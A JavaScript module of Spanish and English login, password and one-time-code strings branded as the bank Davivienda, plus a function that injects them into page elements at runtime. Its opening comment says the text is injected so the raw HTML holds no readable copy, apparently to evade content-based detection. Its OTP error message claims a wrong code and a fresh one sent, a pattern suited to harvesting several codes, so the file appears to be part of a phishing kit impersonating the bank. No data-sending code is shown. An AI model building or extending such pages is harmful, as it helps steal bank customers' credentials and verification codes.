/* Shared dynamic text dictionary for the auth pages (es/en).
   Visible copy is injected at runtime so the raw HTML has no readable text. */
export const AUTH_TEXTS = {
  es: {
    'page.title': 'Inicio',
    'brand.name': 'Davivienda',
    'lang.toggle': 'English',
    'auth.title': 'Autenticación del cliente',
    'auth.id.ph': 'Ingrese número identificación',
    'auth.id.aria': 'Ingrese número identificación',
    'auth.continue': 'Continuar',
    'auth.pass.ph': 'Contraseña',
    'auth.pass.aria': 'Contraseña',
    'auth.back': 'Regresar',
    'auth.login': 'Iniciar sesión',
    'auth.error': 'Usuario o contraseña incorrectos.',
    'auth.links.register': 'Registrarse',
    'auth.links.forgot': '¿Olvidó su contraseña?',
    'auth.links.unlock': 'Desbloquear usuario',
    'auth.links.pay': 'PAY',
    'auth.links.token': 'Token Davivienda',
    'auth.legal': 'Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo',
    'auth.legal.link': 'Click aquí',
    'auth.footer.copyright': 'Davivienda - © 2026 Davivienda - Todos los derechos reservados',
    'auth.footer.version': 'Versión: 11',
    'auth.loading': 'Validando información...',
    'verify.title': 'Autenticación del cliente',
    'verify.prompt': 'Ingrese el código de verificación que te hemos enviado',
    'verify.otp.aria': 'Código de verificación de 6 dígitos',
    'verify.digit': 'Dígito',
    'verify.continue': 'Continuar',
    'verify.verified': 'Verificado',
    'verify.incomplete': 'Ingrese los 6 dígitos',
    'verify.success': '✓ Código verificado correctamente',
    'verify.error': 'El código ingresado es incorrecto. Hemos enviado un nuevo código a su dispositivo.',
    'verify.resend.q': '¿No recibiste el código?',
    'verify.resend.prefix': 'Reenviar en',
    'verify.resend.ready': 'Reenviar código',
    'verify.loading': 'Verificando código...',
  },
  en: {
    'page.title': 'Inicio',
    'brand.name': 'Davivienda',
    'lang.toggle': 'Español',
    'auth.title': 'Customer authentication',
    'auth.id.ph': 'Income iD',
    'auth.id.aria': 'Income iD',
    'auth.continue': 'Continue',
    'auth.pass.ph': 'Password',
    'auth.pass.aria': 'Password',
    'auth.back': 'Back',
    'auth.login': 'Login',
    'auth.error': 'Incorrect username or password.',
    'auth.links.register': 'Register',
    'auth.links.forgot': 'Forgot your password?',
    'auth.links.unlock': 'Unlock user',
    'auth.links.pay': 'PAY',
    'auth.links.token': 'Token Davivienda',
    'auth.legal': 'Davivienda, is committed to protecting the privacy and integrity of your personal and financial information. So here are some security guidelines. Consult them by ',
    'auth.legal.link': 'clicking here',
    'auth.footer.copyright': 'Davivienda - © 2026 Davivienda - All rights reserved',
    'auth.footer.version': 'Version: 11',
    'auth.loading': 'Validating information...',
    'verify.title': 'Customer authentication',
    'verify.prompt': 'Enter the verification code we sent you',
    'verify.otp.aria': '6-digit verification code',
    'verify.digit': 'Digit',
    'verify.continue': 'Continue',
    'verify.verified': 'Verified',
    'verify.incomplete': 'Enter all 6 digits',
    'verify.success': '✓ Code verified successfully',
    'verify.error': 'The code entered is incorrect. We have sent a new code to your device.',
    'verify.resend.q': "Didn't receive the code?",
    'verify.resend.prefix': 'Resend in',
    'verify.resend.ready': 'Resend code',
    'verify.loading': 'Verifying code...',
  },
};

export function applyAuthTexts(language) {
  const dict = AUTH_TEXTS[language] || AUTH_TEXTS.es;

  document.querySelectorAll('[data-txt]').forEach((element) => {
    const value = dict[element.getAttribute('data-txt')];
    if (value !== undefined) element.textContent = value;
  });

  document.querySelectorAll('[data-ph]').forEach((element) => {
    const value = dict[element.getAttribute('data-ph')];
    if (value !== undefined) element.setAttribute('placeholder', value);
  });

  document.querySelectorAll('[data-arialabel]').forEach((element) => {
    const value = dict[element.getAttribute('data-arialabel')];
    if (value !== undefined) {
      const idx = element.getAttribute('data-arialabel-idx');
      element.setAttribute('aria-label', idx ? `${value} ${idx}` : value);
    }
  });

  const title = dict['page.title'];
  if (title) document.title = title;

  return dict;
}
